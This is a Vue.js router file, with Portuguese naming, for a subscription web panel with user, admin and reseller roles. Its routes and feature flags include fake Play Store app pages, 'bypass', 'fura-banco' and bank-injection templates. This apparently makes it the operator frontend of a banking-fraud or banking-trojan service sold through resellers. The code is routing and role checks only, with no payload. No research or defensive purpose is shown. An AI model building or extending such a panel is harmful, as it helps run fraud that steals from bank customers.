import { createRouter, createWebHistory } from 'vue-router';
import LoginView from '../views/LoginView.vue';
import DashboardView from '../views/DashboardView.vue';
import DashboardHomeView from '../views/DashboardHomeView.vue';
import MeusAppsView from '../views/MeusAppsView.vue';
import QrCodeView from '../views/QrCodeView.vue';
import BypassView from '../views/BypassView.vue';
import FuraBancoView from '../views/FuraBancoView.vue';
import ConsultaView from '../views/ConsultaView.vue';
import TopRankPageView from '../views/TopRankPageView.vue';
import RankingView from '../views/RankingView.vue';
import GaleriaTemplatesView from '../views/GaleriaTemplatesView.vue';
import TemplateDetalheView from '../views/TemplateDetalheView.vue';
import TutoriaisView from '../views/TutoriaisView.vue';
import SuporteView from '../views/SuporteView.vue';
import AdminDashboardView from '../views/AdminDashboardView.vue';
import FinanceiroView from '../views/FinanceiroView.vue';
import AdminUsuariosView from '../views/AdminUsuariosView.vue';
import AdminUsuarioEditorView from '../views/AdminUsuarioEditorView.vue';
import PlanosView from '../views/PlanosView.vue';
import AdminPlanoEditorView from '../views/AdminPlanoEditorView.vue';
import AdminAppsView from '../views/AdminAppsView.vue';
import LogsView from '../views/LogsView.vue';
import AdminTopRankView from '../views/AdminTopRankView.vue';
import AdminServicosView from '../views/AdminServicosView.vue';
import AdminAvisoTelaView from '../views/AdminAvisoTelaView.vue';
import AdminTutorialEditorView from '../views/AdminTutorialEditorView.vue';
import AdminSuporteConversaView from '../views/AdminSuporteConversaView.vue';
import RevendedorUsuariosView from '../views/RevendedorUsuariosView.vue';
import RevendedorUsuarioEditorView from '../views/RevendedorUsuarioEditorView.vue';
import RevendedorAppsView from '../views/RevendedorAppsView.vue';
import RevendedorTopRankView from '../views/RevendedorTopRankView.vue';
import RevendedorTutoriaisView from '../views/RevendedorTutoriaisView.vue';
import RevendedorTutorialEditorView from '../views/RevendedorTutorialEditorView.vue';
import RevendedorSuporteConversaView from '../views/RevendedorSuporteConversaView.vue';
import PublicAppView from '../views/PublicAppView.vue';
import { useAuthStore } from '../stores/auth';

const ROLE_ADMIN = ['admin'];
const ROLE_REVENDEDOR = ['revendedor', 'admin'];

const routes = [
  { path: '/', redirect: '/login' },
  { path: '/login', name: 'login', component: LoginView },
  { path: '/acesso', name: 'acesso', component: LoginView },
  // Página pública estilo Play Store (HTML vem do backend via /api/c/:slug)
  { path: '/c/:slug', name: 'public-app', component: PublicAppView },

  {
    path: '/',
    component: DashboardView,
    meta: { requiresAuth: true },
    children: [
      // Rotas do Usuário
      { path: 'dashboard',        name: 'user-dashboard',  component: DashboardHomeView },
      { path: 'play-fake',        name: 'play-fake',       component: MeusAppsView, meta: { requiresFuncionalidade: 'play-fake' } },
      { path: 'bypass',            name: 'bypass',          component: BypassView, meta: { requiresFuncionalidade: 'bypass' } },
      { path: 'fura-banco',      name: 'fura-banco',      component: FuraBancoView, meta: { requiresFuncionalidade: 'fura-banco' } },
      { path: 'consulta',         name: 'consulta',        component: ConsultaView, meta: { requiresFuncionalidade: 'consulta' } },
      { path: 'top-rank',         name: 'top-rank',        component: TopRankPageView },
      { path: 'ranking',          name: 'ranking',         component: RankingView },
      { path: 'qrcode',           name: 'qr-code',         component: QrCodeView, meta: { requiresFuncionalidade: 'qr-code' } },
      { path: 'templates',        name: 'templates',       component: GaleriaTemplatesView, meta: { requiresFuncionalidade: 'screen-troll' } },
      { path: 'templates/:id',    name: 'template-detalhe', component: TemplateDetalheView, meta: { requiresFuncionalidade: 'screen-troll' } },
      { path: 'inject-bancos',    name: 'inject-bancos',   component: GaleriaTemplatesView, meta: { requiresFuncionalidade: 'inject-banco' } },
      { path: 'inject-bancos/:id', name: 'inject-bancos-detalhe', component: TemplateDetalheView, meta: { requiresFuncionalidade: 'inject-banco' } },
      { path: 'tutoriais',        name: 'tutoriais',       component: TutoriaisView },
      { path: 'suporte',          name: 'suporte',         component: SuporteView },

      // Rotas do Admin (backend exige role.admin)
      { path: 'admin/dashboard',           name: 'admin-dashboard',      component: AdminDashboardView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/financeiro',          name: 'admin-financeiro',     component: FinanceiroView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/usuarios',            name: 'admin-usuarios',       component: AdminUsuariosView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/usuarios/novo',       name: 'admin-usuario-novo',   component: AdminUsuarioEditorView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/usuarios/:id',        name: 'admin-usuario-editar', component: AdminUsuarioEditorView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/revendedores',        name: 'admin-revendedores',   component: AdminUsuariosView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/planos',              name: 'admin-planos',         component: PlanosView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/planos/novo',         name: 'admin-plano-novo',     component: AdminPlanoEditorView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/planos/:id',          name: 'admin-plano-editar',   component: AdminPlanoEditorView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/dominios',            redirect: '/admin/dashboard' },
      { path: 'admin/apps',                name: 'admin-apps',           component: AdminAppsView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/logs',                name: 'admin-logs',           component: LogsView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/top-rank',            name: 'admin-top-rank',       component: AdminTopRankView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/templates',           name: 'admin-templates',      component: GaleriaTemplatesView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/servicos',            name: 'admin-servicos',       component: AdminServicosView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/sistema/tela-encerramento', name: 'admin-aviso-tela', component: AdminAvisoTelaView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/tutoriais',           name: 'admin-tutoriais',      component: TutoriaisView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/tutoriais/novo',      name: 'admin-tutorial-novo',  component: AdminTutorialEditorView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/tutoriais/:id',       name: 'admin-tutorial-editar', component: AdminTutorialEditorView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/suporte',             name: 'admin-suporte',        component: SuporteView, meta: { roles: ROLE_ADMIN } },
      { path: 'admin/suporte/:id',         name: 'admin-suporte-conversa', component: AdminSuporteConversaView, meta: { roles: ROLE_ADMIN } },

      // Rotas do Revendedor (backend aceita revendedor + admin)
      { path: 'revendedor',                name: 'rev-root',             redirect: 'revendedor/usuarios' },
      { path: 'revendedor/usuarios',       name: 'rev-usuarios',         component: RevendedorUsuariosView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/usuarios/novo',  name: 'rev-usuario-novo',     component: RevendedorUsuarioEditorView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/usuarios/:id',   name: 'rev-usuario-editar',   component: RevendedorUsuarioEditorView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/apps',           name: 'rev-apps',             component: RevendedorAppsView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/top-rank',       name: 'rev-top-rank',         component: RevendedorTopRankView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/tutoriais',      name: 'rev-tutoriais',        component: RevendedorTutoriaisView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/tutoriais/novo', name: 'rev-tutorial-novo',    component: RevendedorTutorialEditorView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/tutoriais/:id',  name: 'rev-tutorial-editar',  component: RevendedorTutorialEditorView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/suporte',        name: 'rev-suporte',          component: SuporteView, meta: { roles: ROLE_REVENDEDOR } },
      { path: 'revendedor/suporte/:conversationId', name: 'rev-suporte-conversa', component: RevendedorSuporteConversaView, meta: { roles: ROLE_REVENDEDOR } },
    ]
  },

  { path: '/:pathMatch(.*)*', redirect: '/login' }
];

const router = createRouter({
  history: createWebHistory(),
  routes
});

router.beforeEach((to, _from, next) => {
  const authStore = useAuthStore();
  if (to.meta.requiresAuth && !authStore.isAuthenticated) {
    return next('/login');
  }
  if (to.path === '/login' && authStore.isAuthenticated) {
    return next('/dashboard');
  }
  if (to.meta.requiresFuncionalidade) {
    const flag = to.meta.requiresFuncionalidade as string;
    if (!authStore.hasFuncionalidade(flag)) {
      return next('/dashboard');
    }
  }
  if (to.meta.roles) {
    const roles = to.meta.roles as string[];
    if (!authStore.user || !roles.includes(authStore.user.role)) {
      return next('/dashboard');
    }
  }
  next();
});

export default router;
